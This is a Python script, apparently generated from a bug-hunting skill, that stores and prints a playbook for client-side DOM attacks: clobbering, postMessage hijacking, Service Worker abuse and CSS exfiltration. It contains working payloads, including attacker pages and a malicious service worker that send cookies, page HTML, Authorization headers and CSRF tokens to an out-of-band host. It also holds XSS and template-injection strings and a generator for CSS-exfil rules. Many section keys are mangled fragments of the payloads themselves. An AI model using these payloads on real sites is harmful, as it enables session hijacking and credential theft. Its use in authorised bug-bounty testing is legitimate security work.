#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-dom

Skill: HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil
Desc : Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction.

Run:  python claude-bughunter-hunt-dom.py --help
      python claude-bughunter-hunt-dom.py --list
      python claude-bughunter-hunt-dom.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-dom'
TITLE = 'HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil'
DESCRIPTION = 'Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction.'

PAYLOADS = {
    'main': ["name: hunt-dom", "description: \"Hunt client-side DOM vulnerabilities \u2014 DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors \u2192 token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Micha\u0142 Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction.\"", "sources: portswigger_research, hackerone_public, github_security_advisories", "report_count: 17"],
    'hunt-dom-dom-clobbering-postmessage-service-worker-css-exfil': [],
    'crown-jewel-targets': ["DOM-based attacks execute in the victim's browser \u2014 the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.", "**Highest-value chains:**", "- **DOM Clobbering \u2192 DOM-XSS / auth bypass** \u2014 HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code \u2192 sink fires under a markup-only injection where script is filtered.", "- **PostMessage no origin check \u2192 session theft / DOM-XSS** \u2014 a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.", "- **Service Worker abuse** \u2014 register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS \u2192 intercept all in-scope `fetch` \u2192 persistent credential capture.", "- **CSS Exfil** \u2014 attribute-value selectors (`input[value^=\"a\"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS."],
    'grounding-public-research-this-is-distilled-from': ["- **DOM Clobbering / DOM-Invader** \u2014 Gareth Heyes & the PortSwigger Web Security Academy \"DOM clobbering\" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.", "- **DOMPurify clobbering & mXSS bypasses** \u2014 Micha\u0142 Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.", "- **jQuery `htmlPrefilter` self-closing-tag XSS** \u2014 **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.", "- **CSS exfiltration** \u2014 d0nut \"CSS Injection Attacks\" / \"Stealing Data With CSS\" research (sequential `@import` recursion to drop the per-char-position constraint)."],
    'attack-surface-signals': [],
    'injection-points-that-allow-markup-but-may-strip-script': ["user bio / display name / comment / markdown preview / SVG upload / CMS rich-text"],
    'postmessage-endpoints-iframes-sso-widgets-payment-frames-chat-widgets': ["*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes"],
    'service-worker-presence': ["/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)"],
    'css-injection-points': ["?theme=  custom-css profile field  email-template editor  style= passthrough"],
    'phase-1-dom-clobbering': ["```bash"],
    'signal-app-reads-element-ids-names-as-if-they-were-js-objects-or-feeds-a': [],
    'clobberable-global-into-a-sink-location-innerhtml-eval-script-src': [],
    'inject-markup-no-script-at-a-sink-that-lets-named-id-d-elements-through': [],
    'single-level-clobber-of-window-config': [],
    'a-id-config-href-https-evil-com': [],
    'clobber-a-non-built-in-global-the-app-reads-built-in-methods-like-getelementbyid-can-t-be-shadowed-this-way': [],
    'a-id-config-a-a-id-config-name-url-window-config-url-resolves-to-an-attacker-controlled-element-string': [],
    'clobber-a-string-coerced-url-value-anchor-tostring-href': [],
    'a-id-x-a-a-id-x-name-y-href-https-evil-com-x-y-href': [],
    'nested-window-a-b-c-via-form-inputs': [],
    'form-id-a-input-id-b-name-c-value-clobbered-form': [],
    'baseuri-relative-url-hijack': [],
    'base-href-https-evil-com-bends-every-relative-src-href': ["```javascript", "// Browser console: find globals that are clobberable AND reach a sink.", "// A var only matters if the app later concatenates it into a URL/HTML/eval.", "const susp = ['config','settings','options','appConfig','init','data','user',", "'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];", "susp.forEach(k => {", "const v = window[k];", "// HTMLCollection / element => already clobbered or clobberable namespace", "if (v && (v instanceof Element || v instanceof HTMLCollection))", "console.log('[CLOBBERED/NAMESPACE]', k, v);", "else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);", "```bash"],
    'source-review-find-globals-fed-into-sinks-this-is-what-makes-clobbering-exploitable': ["curl -s \"https://$TARGET/\" | grep -nE \\", "\"document\\.(getElementById|baseURI)|window\\.[A-Za-z_]+\\.(url|src|href|html|cmd)|\\", "location\\s*=\\s*[A-Za-z_]|\\.innerHTML\\s*=|eval\\(|new Function\\(|\\.src\\s*=\\s*[A-Za-z_]\""],
    'dom-invader-burp-enable-dom-clobbering-it-auto-finds-clobberable-sources-sinks': ["**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`."],
    'phase-2-postmessage-hijacking': ["Two bug classes: (a) **listener** trusts cross-origin data \u2192 drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` \u2192 any framing page reads them.", "```bash"],
    'find-handlers-and-flag-the-ones-with-no-origin-check': ["grep -rnE \"addEventListener\\(\\s*['\\\"]message['\\\"]|onmessage\\s*=\" recon/$TARGET/ --include=\"*.js\" 2>/dev/null \\"],
    'then-for-each-read-20-lines-where-does-event-data-go-innerhtml-eval-location-token-store': [],
    'senders-that-leak-grep-for-postmessage-secret': ["grep -rnE \"postMessage\\([^,]+,\\s*['\\\"]\\*['\\\"]\\)\" recon/$TARGET/ --include=\"*.js\" 2>/dev/null", "```html", "<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->", "<!-- Host on attacker.com; frames target and pushes a privileged message -->", "<iframe id=\"f\" src=\"https://TARGET/page-with-listener\"></iframe>", "<script>", "document.getElementById('f').onload = () => {", "const w = document.getElementById('f').contentWindow;", "// Shape the payload to whatever the handler routes into a sink:", "w.postMessage({type:'navigate', url:'javascript:fetch(\"https://OOB/x?c=\"+document.cookie)'}, '*');", "w.postMessage('<img src=x onerror=fetch(\"https://OOB/dom?h=\"+btoa(document.body.innerHTML))>', '*');", "</script>", "```html", "<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->", "<iframe id=\"f\" src=\"https://TARGET/sso-or-widget\" style=\"display:none\"></iframe>", "<pre id=\"out\"></pre>", "<script>", "addEventListener('message', e => {", "// Only count it if e.origin is the TARGET and data carries a secret", "out.textContent += `origin=${e.origin}\\ndata=${JSON.stringify(e.data)}\\n---\\n`;", "if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))", "fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof", "</script>"],
    'phase-3-service-worker-abuse': ["**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` \u2014 there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.", "So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.", "```bash"],
    'enumerate-existing-sw-its-scope': ["curl -s \"https://$TARGET/\" | grep -iE \"serviceWorker\\.register|navigator\\.serviceWorker\"", "for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do", "curl -s -o /dev/null -w \"%{http_code} $p\\n\" \"https://$TARGET/$p\"; done", "curl -s \"https://$TARGET/sw.js\" | grep -iE \"scope|addEventListener\\('fetch'|caches\""],
    'look-for-an-upload-route-that-returns-content-type-text-javascript-on-your-content': [],
    'curl-s-d-https-target-uploads-id-grep-i-content-type': ["```javascript", "// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js", "// served by the target). scope must be <= the directory the script is served from", "// unless the response carries Service-Worker-Allowed.", "navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})", ".then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration", ".catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope", "// evil-sw.js (served from the TARGET origin):", "self.addEventListener('fetch', e => {", "e.respondWith(fetch(e.request.clone()).then(async resp => {", "// Exfil URL + any auth header the page attaches, to OOB", "fetch('https://OOB/sw-intercept', {method:'POST',", "body: JSON.stringify({url: e.request.url,", "auth: e.request.headers.get('authorization')})});", "return resp;"],
    'phase-4-css-injection-exfiltration': ["```bash"],
    'prereq-attacker-controls-css-custom-theme-field-style-passthrough-email': [],
    'template-markdown-css-targets-hidden-csrf-input-api-key-in-meta-nonce-attr': [],
    'step-1-confirm-injection-inject-color-red-on-a-known-element-observe-render': [],
    'step-2-leak-attribute-values-char-by-char-via-attribute-selectors-url-to-oob': ["```css", "/* One request fires only for the matching first char. */", "input[name=\"csrf\"][value^=\"a\"] { background: url(https://OOB.example/c?p=0&c=a); }", "input[name=\"csrf\"][value^=\"b\"] { background: url(https://OOB.example/c?p=0&c=b); }", "/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */", "meta[name=\"csrf-token\"][content^=\"a\"] { background: url(https://OOB.example/c?m=a); }", "```python"],
    'generate-a-single-position-css-exfil-set-loop-positions-with-sequential-import-in-practice': ["import string", "chars = string.ascii_letters + string.digits + '-_'", "attr, oob, pos = 'name=\"csrf\"', 'https://OOB.example/c', 0", "print(\"\\n\".join(", "f'input[{attr}][value^=\"{c}\"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))"],
    'real-exfil-needs-recursion-serve-a-stylesheet-whose-import-pulls-the-next': [],
    'position-s-rules-only-after-the-current-prefix-matched-d0nut-technique': [],
    'this-removes-the-static-input-one-char-limitation': [],
    'phase-5-dangerouslysetinnerhtml-framework-sinks': ["```bash", "grep -rnE \"dangerouslySetInnerHTML|v-html=|\\[innerHTML\\]=|\\.html\\(\" recon/$TARGET/ --include=\"*.js\" 2>/dev/null"],
    'in-minified-next-react-bundles': ["curl -s \"https://$TARGET/_next/static/chunks/pages/index.js\" | grep -oP 'dangerouslySetInnerHTML.{0,120}'"],
    'trace-whether-user-data-reaches-it-without-a-sanitizer-dompurify-sanitize-html': [],
    'if-dompurify-is-present-check-for-clobbering-mxss-bypass-bentkowski-research-and-version': [],
    'phase-6-client-side-template-injection': ["```bash"],
    'detect-framework-then-test-the-sink-in-a-sandbox-bypass-form': ["grep -rnE \"angular|vue|handlebars|mustache|nunjucks|alpinejs|\\bv-|ng-app\" recon/$TARGET/ --include=\"*.js\" 2>/dev/null | head"],
    'probe-server-may-render-so-confirm-it-s-client-side-by-viewing-rendered-dom-not-curl': [],
    '7-7-49-in-the-live-dom-not-in-raw-html-csti': [],
    'angularjs-sandbox-escape-style-payloads-version-dependent-older-1-x': [],
    'constructor-constructor-alert-document-domain': [],
    'vue-c-constructor-alert-1-varies-by-vue-2-3-build': [],
    'chain-table': [],
    'tools': ["```bash"],
    'dom-invader-built-into-burp-browser-sources-sinks-postmessage-logger-clobbering-scanner': [],
    'postmessage-tracker-chrome-extension-logging-cross-window-messages': [],
    'burp-collaborator-interactsh-request-bin-mandatory-oob-sink-for-css-exfil-sw-pocs': [],
    'verify-any-tool-url-before-citing-it-in-a-report-do-not-paste-unverified-repo-links': [],
    'validation-false-positive-discipline': ["Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.", "- **DOM Clobbering** \u2014 show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.", "- **PostMessage** \u2014 distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof \u2014 show the privileged action or token exfil.", "- **CSS exfil** \u2014 **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab \u2014 confirm on the Collaborator side.", "- **Service Worker** \u2014 registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs \u2192 reopen \u2192 fresh OOB hit, no XSS re-fire).", "- **General** \u2014 unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.", "**Severity:**", "- Same-origin Service Worker \u2192 persistent credential intercept: **Critical**", "- PostMessage data \u2192 DOM-XSS / token theft \u2192 ATO: **High\u2013Critical**", "- DOM Clobbering \u2192 DOM-XSS reaching auth/session: **High**", "- CSS exfil of CSRF token (OOB-proven) \u2192 CSRF: **Medium** (raise if the chained CSRF is account-critical)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()